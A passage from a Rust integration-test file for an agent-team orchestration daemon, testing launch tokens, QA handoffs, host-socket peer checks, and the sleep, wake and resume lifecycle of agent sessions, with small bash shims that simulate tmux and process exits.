    assert_eq!(snapshot["spawns"][0]["status"], "failed");
    assert_eq!(started(&bench).len(), 1);
}

#[test]
fn a_session_launched_with_its_token_joins_the_team_as_its_role() {
    let mut bench = team_bench();
    recruit_teammates(&mut bench, vec![recruit(cockpit::teams::Role::Designer, "Design the jobs list")]);
    let token = started(&bench)[0][4].clone();
    spawned_session_reports(&mut bench, 40, NEW_SESSION, &token);
    assert_eq!(role_of(&mut bench, NEW_SESSION).as_deref(), Some("designer"));
}

#[test]
fn a_session_without_its_launch_token_joins_nothing() {
    let mut bench = team_bench();
    recruit_teammates(&mut bench, vec![recruit(cockpit::teams::Role::Designer, "Design the jobs list")]);
    spawned_session_reports(&mut bench, 40, NEW_SESSION, "");
    spawned_session_reports(&mut bench, 41, "dddddddd-0000-4000-8000-000000000000", &"0".repeat(32));
    assert_eq!(role_of(&mut bench, NEW_SESSION), None);
    assert_eq!(role_of(&mut bench, "dddddddd-0000-4000-8000-000000000000"), None);
}

#[test]
fn a_handoff_exits_the_previous_qa_and_starts_the_next() {
    use cockpit::teams::Role;
    let mut bench = team_bench();
    recruit_teammates(&mut bench, vec![recruit(Role::Designer, "Design the jobs list"), recruit(Role::Qa, "Check contrast")]);
    let commit_a = "a".repeat(40);
    developer_hands_off(&mut bench, "h1", &commit_a);
    let project = bench.fixture.root.join("home/IdeaProjects/project-a").to_string_lossy().into_owned();
    let qa_start = started(&bench).into_iter().find(|command| command[5] == "qa").expect("no QA start");
    assert_eq!(qa_start[6..8], [project.as_str(), commit_a.as_str()], "QA is copied from the Developer's real folder, at the commit");
    spawned_session_reports(&mut bench, 43, NEW_SESSION, &qa_start[4]);
    assert_eq!(role_of(&mut bench, NEW_SESSION).as_deref(), Some("qa"));
    developer_hands_off(&mut bench, "h2", &"b".repeat(40));
    let starts = started(&bench);
    assert!(starts.contains(&vec!["cockpit".to_string(), "exit".into(), NEW_SESSION.into()]), "{starts:?}");
    assert_eq!(starts.iter().filter(|command| command.get(5).is_some_and(|role| role == "qa")).count(), 2);
    assert_eq!(role_of(&mut bench, NEW_SESSION), None);
}

#[test]
fn a_spawned_qa_report_queues_one_exit_and_retries_a_failed_launch() {
    use cockpit::teams::{AgentAction, MessageKind, Role, Submission};
    let mut bench = team_bench();
    recruit_teammates(&mut bench, vec![recruit(Role::Qa, "Check contrast")]);
    developer_hands_off(&mut bench, "h1", &"a".repeat(40));
    let qa_start = started(&bench).into_iter().find(|command| command[5] == "qa").unwrap();
    spawned_session_reports(&mut bench, 43, NEW_SESSION, &qa_start[4]);
    let own = crate::teams::request(&mut bench.registry, 43, AgentAction::Context).unwrap().result.unwrap();
    let handoff_id: String = bench.registry.teams.as_ref().unwrap().query_row(
        "SELECT handoff_id FROM spawns WHERE token=?1", [&qa_start[4]], |row| row.get(0)).unwrap();
    let task = cockpit::teams::TaskKey { project: own["project"].as_str().unwrap().into(), task_id: "1d3fd318".into() };
    crate::teams::request(&mut bench.registry, 43, AgentAction::Send { message: Submission { task,
        submission_key: "final-findings".into(), recipient: OPENCODE_SESSION.into(), kind: MessageKind::Findings,
        body: "No findings.".into(), thread_id: None, handoff_id: Some(handoff_id) } }).unwrap().result.unwrap();
    bench.world.borrow_mut().start_fails = true;
    crate::teams::start_spawns(&mut bench.registry).unwrap();
    bench.world.borrow_mut().start_fails = false;
    crate::teams::start_spawns(&mut bench.registry).unwrap();
    crate::teams::start_spawns(&mut bench.registry).unwrap();
    let exits: Vec<_> = started(&bench).into_iter().filter(|command| command.get(1).is_some_and(|action| action == "exit")).collect();
    assert_eq!(exits, vec![vec!["cockpit", "exit", NEW_SESSION]; 2]);
}

#[test]
fn only_host_processes_may_use_the_team_host_socket() {
    let tree = Tree(vec![("50", Some("30"), "sandbox", environment(&[])), ("30", None, "host", environment(&[]))]);
    assert!(crate::teams::host_peer_allowed(&tree, "30"));
    assert!(!crate::teams::host_peer_allowed(&tree, "50"));
    assert!(!crate::teams::host_peer_allowed(&tree, "999"));
}

fn sleep_host(bench: &mut Bench, request: &str, token: Option<&str>) -> Result<Value, cockpit::teams::TeamError> {
    sleep_host_for(bench, SESSION_A, request, token)
}

fn sleep_host_for(bench: &mut Bench, session: &str, request: &str, token: Option<&str>) -> Result<Value, cockpit::teams::TeamError> {
    if request == "prepare_sleep" && !bench.sleep_guards.contains_key(session) {
        use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
        let directory = cockpit::paths::runtime_dir().join("cockpit.sleep-operations");
        fs::create_dir_all(&directory).unwrap();
        fs::set_permissions(&directory, fs::Permissions::from_mode(0o700)).unwrap();
        let guard = fs::OpenOptions::new().read(true).write(true).create(true).truncate(false).mode(0o600).open(directory.join(session)).unwrap();
        guard.try_lock().unwrap();
        bench.sleep_guards.insert(session.into(), guard);
    }
    let mut value = json!({"request":request,"session_id":session});
    if let Some(token) = token { value["token"] = json!(token); }
    crate::teams::host(&mut bench.registry, std::process::id(), serde_json::from_value(value).unwrap()).and_then(|reply| reply.result)
}

fn prepare_team_sleep(bench: &mut Bench) -> String {
    prepare_member_sleep(bench, SESSION_A)
}

fn prepare_member_sleep(bench: &mut Bench, session: &str) -> String {
    use std::os::unix::fs::PermissionsExt;
    let result = sleep_host_for(bench, session, "prepare_sleep", None).unwrap();
    let token = result["token"].as_str().unwrap().to_string();
    let folder = cockpit::paths::asleep_dir();
    fs::create_dir_all(&folder).unwrap();
    fs::set_permissions(&folder, fs::Permissions::from_mode(0o700)).unwrap();
    let note = folder.join(session);
    fs::write(&note, json!({"session":session,"agent":bench.registry.sessions[session].agent,"cwd":bench.registry.sessions[session].cwd,
        "slept_at":cockpit::util::now() as i64,"team_resume":token}).to_string()).unwrap();
    fs::set_permissions(note, fs::Permissions::from_mode(0o600)).unwrap();
    sleep_host_for(bench, session, "sleep_recorded", Some(&token)).unwrap();
    token
}

fn sleeping_team_bench() -> (Bench, String) {
    let mut bench = linked_team_bench();
    let token = prepare_team_sleep(&mut bench);
    bench.world.borrow_mut().sender_runtimes.remove(&10);
    (bench, token)
}

fn resumed_session_reports(bench: &mut Bench, token: &str) {
    bench.world.borrow_mut().resume_tokens.insert(40, token.into());
    spawned_session_reports(bench, 40, SESSION_A, "");
}

#[test]
fn resume_token_in_report_or_inner_environment_is_not_trusted() {
    let token = "a".repeat(32);
    let report = parse_session(&json!({"session":SESSION_A,"project":"p","resume_token":token}).to_string()).unwrap();
    assert!(report.resume_token.is_none());
    let tree = Tree(vec![("50", Some("30"), "sandbox", environment(&[("COCKPIT_TEAM_RESUME", &token)])),
        ("30", None, "host", environment(&[]))]);
    assert_eq!(crate::registry::trusted_resume_token(&tree, "50"), None);
    let tree = Tree(vec![("50", Some("30"), "sandbox", environment(&[])),
        ("30", None, "host", environment(&[("COCKPIT_TEAM_RESUME", &token)]))]);
    assert_eq!(crate::registry::trusted_resume_token(&tree, "50"), Some(token));
}

#[test]
fn verified_sleep_replacement_rejoins_before_startup_recovery() {
    let (mut bench, token) = sleeping_team_bench();
    send_to_designer(&mut bench, "while-asleep");
    bench.registry.teams = None;
    resumed_session_reports(&mut bench, &token);
    let delivery = crate::teams::request(&mut bench.registry, 40, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(delivery["dispatch_id"].is_string(), "{delivery}");
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "bound");
    fs::remove_file(cockpit::paths::asleep_dir().join(SESSION_A)).unwrap();
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "bound");
    bench.world.borrow_mut().sender_runtimes.remove(&40);
    bench.world.borrow_mut().resume_tokens.insert(41, token.clone());
    spawned_session_reports(&mut bench, 41, SESSION_A, "");
    crate::teams::live_sessions(&mut bench.registry).unwrap();
    assert_eq!(cockpit::teams::store::member_runtime(bench.registry.teams.as_ref().unwrap(), SESSION_A).unwrap().as_deref(), Some("runtime-40"));
}

#[test]
fn resume_refuses_live_old_runtime_or_different_checkout() {
    let mut bench = linked_team_bench();
    let token = prepare_team_sleep(&mut bench);
    bench.world.borrow_mut().resume_tokens.insert(40, token.clone());
    // The authenticated registry rejects replacement while the old launch still lives.
    bench.world.borrow_mut().sender_targets.insert(40, target(&[("tmux_pane", "%40")]));
    bench.world.borrow_mut().sender_runtimes.insert(40, "runtime-40".into());
    let report = parse_session(&json!({"session":SESSION_A,"project":"p","cwd":"/elsewhere"}).to_string()).unwrap();
    assert!(bench.registry.report_from(report, 40).is_err());
    bench.world.borrow_mut().sender_runtimes.remove(&10);
    let other_checkout = bench.fixture.root.join("home/IdeaProjects/.parallel/project-a/other");
    fs::create_dir_all(&other_checkout).unwrap();
    bench.world.borrow_mut().sender_directories.insert(40, other_checkout.to_string_lossy().into());
    // No cwd claim: the daemon must still take the replacement's actual host checkout.
    let report = parse_session(&json!({"session":SESSION_A,"project":"project-a","state":"waiting"}).to_string()).unwrap();
    bench.registry.report_from(report, 40).unwrap();
    crate::teams::live_sessions(&mut bench.registry).unwrap();
    assert_ne!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "bound");
}

#[test]
fn sleep_resume_after_registry_loss_still_checks_old_process_death() {
    let mut bench = linked_team_bench();
    let token = prepare_team_sleep(&mut bench);
    bench.registry.sessions.remove(SESSION_A);
    resumed_session_reports(&mut bench, &token);
    crate::teams::live_sessions(&mut bench.registry).unwrap();
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "prepared");
    assert_eq!(cockpit::teams::store::member_runtime(bench.registry.teams.as_ref().unwrap(), SESSION_A).unwrap().as_deref(), Some("runtime-10"));
}

#[test]
fn deleted_or_replaced_sleep_record_blocks_reattachment() {
    for change in ["delete", "replace", "symlink", "ended", "expired", "public"] {
        let (mut bench, token) = sleeping_team_bench();
        let note = cockpit::paths::asleep_dir().join(SESSION_A);
        match change {
            "delete" => fs::remove_file(&note).unwrap(),
            "replace" => fs::write(&note, "{}").unwrap(),
            "symlink" => { let original = note.with_extension("old"); fs::rename(&note, &original).unwrap(); std::os::unix::fs::symlink(original, &note).unwrap(); },
            "ended" => fs::write(cockpit::paths::ended_sessions(), format!("{SESSION_A}\n")).unwrap(),
            "expired" => { let mut value: Value = serde_json::from_str(&fs::read_to_string(&note).unwrap()).unwrap(); value["slept_at"] = json!(1); fs::write(&note, value.to_string()).unwrap(); },
            "public" => { use std::os::unix::fs::PermissionsExt; fs::set_permissions(&note, fs::Permissions::from_mode(0o644)).unwrap(); },
            _ => unreachable!(),
        }
        resumed_session_reports(&mut bench, &token);
        crate::teams::live_sessions(&mut bench.registry).unwrap();
        assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "cancelled", "{change}");
    }
}

#[test]
fn queued_team_message_launches_one_sleep_wake() {
    let (mut bench, token) = sleeping_team_bench();
    send_to_designer(&mut bench, "while-asleep");
    assert!(started(&bench).is_empty(), "agent request never synchronously launches a wake");
    for _ in 0..2 { crate::teams::host_snapshot(&mut bench.registry).unwrap(); }
    assert_eq!(started(&bench), vec![vec!["cockpit", "wake", SESSION_A]]);
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "launch_requested");
    sleep_host(&mut bench, "begin_wake", Some(&token)).unwrap();
    assert!(sleep_host(&mut bench, "begin_wake", Some(&token)).is_err());
}

#[test]
fn approved_teammate_sleep_wakes_and_delivers_once_through_native_receipt() {
    use cockpit::teams::{AgentAction, MessageKind, Submission, TaskKey, TransportOutcome};
    for (session, peer, sender, agent, role) in [(SESSION_A, 10, 20, "claude", "designer"),
        (OPENCODE_SESSION, 20, 10, "opencode", "developer")] {
        let mut bench = linked_team_bench();
        let before = crate::teams::request(&mut bench.registry, peer, AgentAction::Context).unwrap().result.unwrap();
        let snapshot = crate::teams::host_snapshot(&mut bench.registry).unwrap();
        let member = snapshot["members"].as_array().unwrap().iter().find(|member| member["session_id"] == session).unwrap().clone();
        assert_eq!(member["role"], role);
        let token = prepare_member_sleep(&mut bench, session);
        assert!(sleep_host_for(&mut bench, session, "begin_wake", Some(&token)).is_err(), "old process still lives");
        bench.world.borrow_mut().sender_runtimes.remove(&peer);
        let task: TaskKey = serde_json::from_value(before["task"].clone()).unwrap();
        let message = Submission { task, submission_key: "while-asleep".into(), recipient: session.into(), kind: MessageKind::Notice,
            body: "The frame is ready.".into(), thread_id: None, handoff_id: None };
        crate::teams::request(&mut bench.registry, sender, AgentAction::Send { message }).unwrap().result.unwrap();
        assert!(started(&bench).is_empty());
        for _ in 0..2 { crate::teams::host_snapshot(&mut bench.registry).unwrap(); }
        assert_eq!(started(&bench), vec![vec!["cockpit", "wake", session]]);
        sleep_host_for(&mut bench, session, "begin_wake", Some(&token)).unwrap();
        assert!(cockpit::paths::asleep_dir().join(session).exists(), "note retained until binding acknowledgement");
        bench.registry.teams = None;
        bench.world.borrow_mut().resume_tokens.insert(40, token.clone());
        spawned_agent_reports(&mut bench, 40, session, agent, "");
        let after = crate::teams::request(&mut bench.registry, 40, AgentAction::Context).unwrap().result.unwrap();
        assert_eq!(after, before, "same approved identity, task and roles");
        let snapshot = crate::teams::host_snapshot(&mut bench.registry).unwrap();
        let replacement = snapshot["members"].as_array().unwrap().iter().find(|member| member["session_id"] == session).unwrap();
        assert_eq!(replacement["epoch"], member["epoch"]);
        assert_eq!(replacement["runtime"], "runtime-40");
        assert_eq!(replacement["agent"], agent);
        assert_ne!(replacement["runtime"], member["runtime"]);
        assert_eq!(sleep_host_for(&mut bench, session, "sleep_status", Some(&token)).unwrap()["state"], "bound");
        fs::remove_file(cockpit::paths::asleep_dir().join(session)).unwrap();
        let delivery = crate::teams::request(&mut bench.registry, 40, AgentAction::Receive).unwrap().result.unwrap();
        assert!(delivery["text"].as_str().unwrap().contains("The frame is ready."));
        assert!(crate::teams::request(&mut bench.registry, 40, AgentAction::Receive).unwrap().result.unwrap().is_null());
        let receipt = AgentAction::Receipt { dispatch_id: delivery["dispatch_id"].as_str().unwrap().into(),
            outcome: TransportOutcome::Received { native_id: "native-message-1".into() } };
        crate::teams::request(&mut bench.registry, 40, receipt.clone()).unwrap().result.unwrap();
        crate::teams::request(&mut bench.registry, 40, receipt).unwrap().result.unwrap();
        bench.report(session, json!({"state":"working"}));
        bench.report(session, json!({"state":"waiting"}));
        assert!(crate::teams::request(&mut bench.registry, 40, AgentAction::Receive).unwrap().result.unwrap().is_null());
        let snapshot = crate::teams::host_snapshot(&mut bench.registry).unwrap();
        assert_eq!(snapshot["messages"].as_array().unwrap().len(), 1);
        assert_eq!(snapshot["messages"][0]["state"], "received");
        let connection = bench.registry.teams.as_ref().unwrap();
        let attempts: i64 = connection.query_row("SELECT count(*) FROM attempts", [], |row| row.get(0)).unwrap();
        let receipts: i64 = connection.query_row("SELECT count(*) FROM attempts WHERE state='received' AND native_id='native-message-1'", [], |row| row.get(0)).unwrap();
        assert_eq!((attempts, receipts), (1, 1));
        assert_eq!(started(&bench), vec![vec!["cockpit", "wake", session]]);
    }
}

#[test]
fn revoked_teammate_sleep_never_wakes_or_rejoins() {
    use cockpit::teams::{AgentAction, HostAction};
    let (mut bench, token) = sleeping_team_bench();
    send_to_designer(&mut bench, "while-asleep");
    let context = crate::teams::request(&mut bench.registry, 20, AgentAction::Context).unwrap().result.unwrap();
    let task = serde_json::from_value(context["task"].clone()).unwrap();
    crate::teams::host_control(&mut bench.registry, &HostAction::Unlink { request_id: "revoke-sleeper".into(), task, session_id: SESSION_A.into() }).unwrap().result.unwrap();
    for _ in 0..2 { crate::teams::host_snapshot(&mut bench.registry).unwrap(); }
    assert!(started(&bench).is_empty());
    resumed_session_reports(&mut bench, &token);
    let context = crate::teams::request(&mut bench.registry, 40, AgentAction::Context).unwrap().result.unwrap();
    assert!(context["members"].as_array().unwrap().is_empty());
    assert!(crate::teams::request(&mut bench.registry, 40, AgentAction::Receive).unwrap().result.unwrap().is_null());
    let snapshot = crate::teams::host_snapshot(&mut bench.registry).unwrap();
    assert_eq!(snapshot["messages"][0]["state"], "cancelled");
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "cancelled");
}

#[test]
fn manually_resumed_teammate_without_permit_cannot_claim_sleeping_queue() {
    use cockpit::teams::AgentAction;
    let (mut bench, token) = sleeping_team_bench();
    send_to_designer(&mut bench, "while-asleep");
    spawned_session_reports(&mut bench, 40, SESSION_A, "");
    let context = crate::teams::request(&mut bench.registry, 40, AgentAction::Context).unwrap().result.unwrap();
    assert!(context["task"].is_null());
    assert!(context["members"].as_array().unwrap().is_empty());
    assert!(crate::teams::request(&mut bench.registry, 40, AgentAction::Receive).unwrap().result.unwrap().is_null());
    assert_ne!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "bound");
    assert_eq!(cockpit::teams::store::member_runtime(bench.registry.teams.as_ref().unwrap(), SESSION_A).unwrap().as_deref(), Some("runtime-10"));
}

#[test]
fn wake_failure_keeps_queue_and_reports_error() {
    let (mut bench, token) = sleeping_team_bench();
    send_to_designer(&mut bench, "while-asleep");
    bench.world.borrow_mut().start_fails = true;
    let snapshot = crate::teams::host_snapshot(&mut bench.registry).unwrap();
    assert_eq!(snapshot["sleeps"][0]["state"], "failed");
    assert!(!snapshot["sleeps"][0]["error"].as_str().unwrap().is_empty());
    assert!(!snapshot.to_string().contains(&token));
    assert_eq!(snapshot["messages"][0]["state"], "queued");
}

#[test]
fn daemon_restart_does_not_repeat_a_requested_wake() {
    let (mut bench, token) = sleeping_team_bench();
    send_to_designer(&mut bench, "while-asleep");
    crate::teams::host_snapshot(&mut bench.registry).unwrap();
    bench.registry.teams = None;
    crate::teams::host_snapshot(&mut bench.registry).unwrap();
    assert_eq!(started(&bench).len(), 1);
    bench.registry.teams.as_ref().unwrap().execute("UPDATE sleep_permits SET started_at=0", []).unwrap();
    let snapshot = crate::teams::host_snapshot(&mut bench.registry).unwrap();
    assert_eq!(snapshot["sleeps"][0]["state"], "failed");
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["error"], "wake acknowledgement timed out");
    assert_eq!(started(&bench).len(), 1);
}

#[test]
fn newly_prepared_sleep_waits_for_explicit_note_recording() {
    let mut bench = linked_team_bench();
    let token = sleep_host(&mut bench, "prepare_sleep", None).unwrap()["token"].as_str().unwrap().to_string();
    crate::teams::host_snapshot(&mut bench.registry).unwrap();
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "prepared");
    assert!(sleep_host(&mut bench, "sleep_recorded", Some(&token)).is_err());
    bench.world.borrow_mut().sender_runtimes.remove(&10);
    crate::teams::host_snapshot(&mut bench.registry).unwrap();
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "cancelled");
}

#[test]
fn abandoned_sleep_preparation_restores_live_sends_and_claims_without_losing_queue() {
    use cockpit::teams::{AgentAction, MessageKind, Submission};
    let mut bench = linked_team_bench();
    // The caller never needs to receive this reply to release its operation lock.
    let token = sleep_host(&mut bench, "prepare_sleep", None).unwrap()["token"].as_str().unwrap().to_string();
    send_to_designer(&mut bench, "during-prepare");
    assert!(crate::teams::request(&mut bench.registry, 10, AgentAction::Receive).unwrap().result.unwrap().is_null());
    bench.sleep_guards.clear(); // Manager and its inherited exit-driving children have ended.
    bench.registry.teams = None; // The guard is kernel state, not daemon memory.
    let delivery = crate::teams::request(&mut bench.registry, 10, AgentAction::Receive).unwrap().result.unwrap();
    assert!(delivery["dispatch_id"].is_string(), "{delivery}");
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "cancelled");
    let context = crate::teams::request(&mut bench.registry, 10, AgentAction::Context).unwrap().result.unwrap();
    let message = Submission { task: serde_json::from_value(context["task"].clone()).unwrap(), submission_key: "after-abandon".into(),
        recipient: OPENCODE_SESSION.into(), kind: MessageKind::Notice, body: "Still awake".into(), thread_id: None, handoff_id: None };
    crate::teams::request(&mut bench.registry, 10, AgentAction::Send { message }).unwrap().result.unwrap();
    assert!(started(&bench).is_empty());
}

#[test]
fn recorded_sleep_survives_normal_operation_exit_after_old_runtime_death() {
    let mut bench = linked_team_bench();
    let token = prepare_team_sleep(&mut bench);
    bench.world.borrow_mut().sender_runtimes.remove(&10);
    bench.sleep_guards.clear();
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "prepared");
    send_to_designer(&mut bench, "after-normal-sleep");
    crate::teams::host_snapshot(&mut bench.registry).unwrap();
    assert_eq!(started(&bench), vec![vec!["cockpit", "wake", SESSION_A]]);
}

#[test]
fn recorded_abandoned_sleep_recovers_when_helpers_end_with_old_runtime_alive() {
    let mut bench = linked_team_bench();
    let token = prepare_team_sleep(&mut bench);
    send_to_designer(&mut bench, "after-recorded-abandonment");
    bench.sleep_guards.clear();
    let delivery = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(delivery["dispatch_id"].is_string(), "{delivery}");
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "cancelled");
}

#[test]
fn live_sleep_operation_never_loses_its_pause_to_a_timeout() {
    let mut bench = linked_team_bench();
    let token = sleep_host(&mut bench, "prepare_sleep", None).unwrap()["token"].as_str().unwrap().to_string();
    bench.registry.teams.as_ref().unwrap().execute("UPDATE sleep_permits SET expires_at=0", []).unwrap();
    send_to_designer(&mut bench, "during-long-operation");
    assert!(crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap().is_null());
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "prepared");
    bench.sleep_guards.clear();
    assert!(crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap()["dispatch_id"].is_string());
}

#[test]
fn sleep_prepare_requires_a_lock_inherited_by_the_verified_host_peer() {
    let mut bench = linked_team_bench();
    let request = || serde_json::from_value(json!({"request":"prepare_sleep","session_id":SESSION_A})).unwrap();
    assert!(crate::teams::host(&mut bench.registry, std::process::id(), request()).is_err());
    sleep_host(&mut bench, "prepare_sleep", None).unwrap();
    assert!(crate::teams::host(&mut bench.registry, u32::MAX, request()).is_err(), "a claimed/reused PID is not operation evidence");
    bench.sleep_guards.clear();
    assert!(crate::teams::host(&mut bench.registry, std::process::id(), request()).is_err(), "an unlocked file is not operation evidence");
}

#[test]
fn killed_manager_leaves_pause_owned_by_its_live_inherited_exit_helper() {
    use std::time::{Duration, Instant};
    let mut bench = linked_team_bench();
    // Create the protected file with the same permissions as the real host script.
    let old = sleep_host(&mut bench, "prepare_sleep", None).unwrap()["token"].as_str().unwrap().to_string();
    bench.sleep_guards.clear();
    sleep_host(&mut bench, "cancel_sleep", Some(&old)).unwrap();
    let directory = cockpit::paths::runtime_dir().join("cockpit.sleep-operations");
    let ready = directory.join("helper-ready");
    let release = directory.join("release-helper");
    let mut manager = std::process::Command::new("bash").args(["-c", r#"
exec 9<>"$1"
flock 9
bash -c 'echo "$BASHPID" > "$1"; for ((attempt=0; attempt<500; attempt++)); do [[ ! -e $2 ]] || exit 0; sleep .01; done' helper "$2" "$3" &
wait
"#, "manager"]).arg(directory.join(SESSION_A)).arg(&ready).arg(&release).spawn().unwrap();
    let deadline = Instant::now() + Duration::from_secs(5);
    while !ready.exists() && Instant::now() < deadline { std::thread::sleep(Duration::from_millis(10)); }
    assert!(ready.exists(), "exit helper did not start");
    let request = serde_json::from_value(json!({"request":"prepare_sleep","session_id":SESSION_A})).unwrap();
    crate::teams::host(&mut bench.registry, manager.id(), request).unwrap().result.unwrap(); // Reply may be lost.
    manager.kill().unwrap();
    manager.wait().unwrap();
    send_to_designer(&mut bench, "after-manager-killed");
    assert!(crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap().is_null());
    fs::write(release, "").unwrap();
    let deadline = Instant::now() + Duration::from_secs(5);
    let probe = fs::File::open(directory.join(SESSION_A)).unwrap();
    while probe.try_lock().is_err() && Instant::now() < deadline { std::thread::sleep(Duration::from_millis(10)); }
    drop(probe);
    let delivery = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(delivery["dispatch_id"].is_string(), "{delivery}");
    assert!(started(&bench).is_empty());
}

#[test]
fn explicit_sleep_cancellation_cannot_bypass_live_operation_ownership() {
    let mut bench = linked_team_bench();
    let token = prepare_team_sleep(&mut bench);
    send_to_designer(&mut bench, "during-cancel");
    let result = sleep_host(&mut bench, "cancel_sleep", Some(&token));
    let delivery = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(result.is_err(), "cancellation must wait for all operation descriptors to close");
    assert!(delivery.is_null(), "{delivery}");
}

#[test]
fn sigterm_exit_cleanup_waits_for_real_claude_exit_helper_before_restoring_traffic() {
    interrupt_recorded_claude_exit(false);
}

#[test]
fn sigterm_exit_cleanup_preserves_resume_when_surviving_helper_exits_old_runtime() {
    interrupt_recorded_claude_exit(true);
}

fn interrupt_recorded_claude_exit(does_helper_exit_agent: bool) {
    use std::io::{Read, Write};
    use std::os::unix::fs::PermissionsExt;
    use std::os::unix::net::UnixListener;
    use std::process::{Command, Stdio};
    use std::time::{Duration, Instant};
    use cockpit::teams::{AgentAction, MessageKind, Submission};

    let mut bench = linked_team_bench();
    let root = bench.fixture.root.clone();
    let repository = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..").canonicalize().unwrap();
    let script = fs::read_to_string(repository.join("config/bin/.local/bin/cockpit")).unwrap();
    let definitions = root.join("manager-functions.sh");
    // Keep the actual lifecycle, EXIT trap, cancellation and agent exit functions; stub only host I/O/safety inputs.
    fs::write(&definitions, script.split("# Every command leaves a line:").next().unwrap()).unwrap();
    let shims = root.join("shims");
    fs::create_dir(&shims).unwrap();
    fs::write(shims.join("tmux"), r#"#!/usr/bin/env bash
if [[ $1 == send-keys ]]; then
  [[ $* == *C-c* ]] || exit 2
  echo "$PPID" > "$TEST_ROOT/helper-ready"
  kill -TERM "$PPID"
  for ((attempt=0; attempt<500; attempt++)); do
    [[ ! -e $TEST_ROOT/release-helper ]] || break
    sleep .01
  done
  echo acted > "$TEST_ROOT/helper-acted"
  exit 1
fi
[[ $1 != display-message ]] || echo claude-test
exit 0
"#).unwrap();
    fs::set_permissions(shims.join("tmux"), fs::Permissions::from_mode(0o700)).unwrap();
    let host_socket = cockpit::paths::team_host_socket();
    fs::create_dir_all(host_socket.parent().unwrap()).unwrap();
    let listener = UnixListener::bind(host_socket).unwrap();
    listener.set_nonblocking(true).unwrap();
    let driver = root.join("driver.sh");
    fs::write(&driver, r#"set -euo pipefail
source "$TEST_DEFINITIONS"
source "$TEST_REPOSITORY/config/bin/.local/bin/cockpit-agents/claude.sh"
session_field() {
  case $2 in project) echo project-a;; tmux_pane) echo %4;; since|started) echo 1;; cwd) echo "$TEST_CHECKOUT";; task) echo test;; esac
}
agent_of_session() { echo claude; }
require_feature() { :; }
sleep_blocker() { :; }
session_is_remote() { return 1; }
log_event() { :; }
audit_event() { :; }
thaw_frozen_pane() { :; }
pane_at_prompt() { return 1; }
clear_exited_viewer() { :; }
sleep_session aaaaaaaa-0000-4000-8000-000000000000
"#).unwrap();
    let mut manager = Command::new("bash").arg(driver)
        .env("PATH", format!("{}:{}:/usr/bin:/bin", shims.display(), repository.join("config/bin/.local/bin").display()))
        .env("TEST_ROOT", &root).env("TEST_DEFINITIONS", definitions).env("TEST_REPOSITORY", repository)
        .env("TEST_CHECKOUT", &bench.registry.sessions[SESSION_A].cwd)
        .stdout(Stdio::null()).stderr(Stdio::null()).spawn().unwrap();
    let deadline = Instant::now() + Duration::from_secs(5);
    let mut recorded = false;
    loop {
        while let Ok((mut stream, _)) = listener.accept() {
            stream.set_read_timeout(Some(Duration::from_secs(1))).unwrap();
            let peer = crate::fifo::peer_pid(&stream).unwrap();
            let mut input = String::new();
            stream.read_to_string(&mut input).unwrap();
            let request: cockpit::teams::HostRequest = serde_json::from_str(&input).unwrap();
            recorded |= matches!(request, cockpit::teams::HostRequest::SleepRecorded { .. });
            let reply = crate::teams::host(&mut bench.registry, peer, request)
                .unwrap_or_else(|error| cockpit::teams::TeamReply { request_id: "sleep".into(), result: Err(error) });
            stream.write_all(serde_json::to_string(&reply).unwrap().as_bytes()).unwrap();
        }
        if manager.try_wait().unwrap().is_some() || Instant::now() >= deadline { break; }
        std::thread::sleep(Duration::from_millis(5));
    }
    let helper_started = root.join("helper-ready").exists();
    let context = crate::teams::request(&mut bench.registry, 10, AgentAction::Context).unwrap().result.unwrap();
    send_to_designer(&mut bench, "during-interrupted-recorded-exit");
    let paused_delivery = crate::teams::request(&mut bench.registry, 10, AgentAction::Receive).unwrap().result.unwrap();
    let outgoing = AgentAction::Send { message: Submission { task: serde_json::from_value(context["task"].clone()).unwrap(),
        submission_key: "during-exit".into(), recipient: OPENCODE_SESSION.into(), kind: MessageKind::Notice,
        body: "Must wait for exit helper".into(), thread_id: None, handoff_id: None } };
    let paused_send = crate::teams::request(&mut bench.registry, 10, outgoing.clone()).and_then(|reply| reply.result);
    let note_retained = cockpit::paths::asleep_dir().join(SESSION_A).exists();
    fs::write(root.join("release-helper"), "").unwrap();
    let deadline = Instant::now() + Duration::from_secs(5);
    let guard = fs::File::open(cockpit::paths::runtime_dir().join("cockpit.sleep-operations").join(SESSION_A)).unwrap();
    while guard.try_lock().is_err() && Instant::now() < deadline { std::thread::sleep(Duration::from_millis(10)); }
    drop(guard);
    if manager.try_wait().unwrap().is_none() { manager.kill().unwrap(); }
    manager.wait().unwrap();
